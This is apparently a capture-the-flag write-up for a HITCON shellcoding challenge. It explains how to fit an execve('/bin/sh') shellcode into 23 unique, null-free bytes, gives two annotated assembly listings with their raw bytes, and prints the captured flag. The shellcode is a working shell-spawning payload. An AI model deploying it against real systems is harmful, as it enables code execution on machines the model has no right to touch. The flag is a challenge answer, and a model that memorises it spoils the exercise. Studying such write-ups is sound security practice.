

# Description:

 Are you good at shellcoding? Warm up!

 nc 52.69.40.204 8361
  
 # Write-up
 
 This was a straightforward challenge that we THOUGHT might need a one-gadget, but ultimately it didn't.
 We got a binary that will run a shellcode with the following restrictions:
 * Up to 24 bytes
 * No null bytes
 * Every byte in the shellcode can appear only once.
 
 Most of the registers are zeroed out before our shellcode runs, and except for rsp, all the relevant ones. 
 
 
 I tried to craft a shellcode which will run execve("/bin/sh", 0, 0)
 So we need rdi = &("/bin/sh") , rsi = 0, rdx = 0 and rax = 59 (0x3b), before using syscall.
 
The challenge is to get "/bin/sh" in the stack, as it contains a null byte and two '/'
Basically we need push : 0x0068732f6e69622f to the stack
One way to do it using the right shifted number, shifting left and adding 1 :
```
0:  48 bb 17 b1 34 b7 97 39 34 00    movabs rbx,0x343997b734b117
a:  48 d1 e3                         shl    rbx,1
d:  48 ff c3                         inc    rbx
10: 53                               push   rbx
11: 54                               push   rsp
12: 5f                               pop    rdi
13: b0 3b                            mov    al,0x3b
15: 0f 05                            syscall
```
That's 23 bytes, but with two collisions.
We obviously can't shift left and inc (or add), but the string's two's complement can be decoded in one opcode.
Unfortunately, this also have the byte 48.
So now, one collision left, which can be solved with one of the the numbered registers:

```
0:  49 b9 d1 9d 96 91 d0 8c 97 ff    movabs r9,0xff978cd091969dd1
a:  4c 89 cb                         mov    rbx,r9
d:  48 f7 db                         neg    rbx
10: 53                               push   rbx
11: 54                               push   rsp
12: 5f                               pop    rdi
13: b0 3b                            mov    al,0x3b
15: 0f 05                            syscall
```


This shellcode is 23 bytes long without repitition, with every byte of it unique.
We got a shell on the server and could print the flag:
hitcon{sh3llc0d1n9_1s_4_b4by_ch4ll3n93_4u}
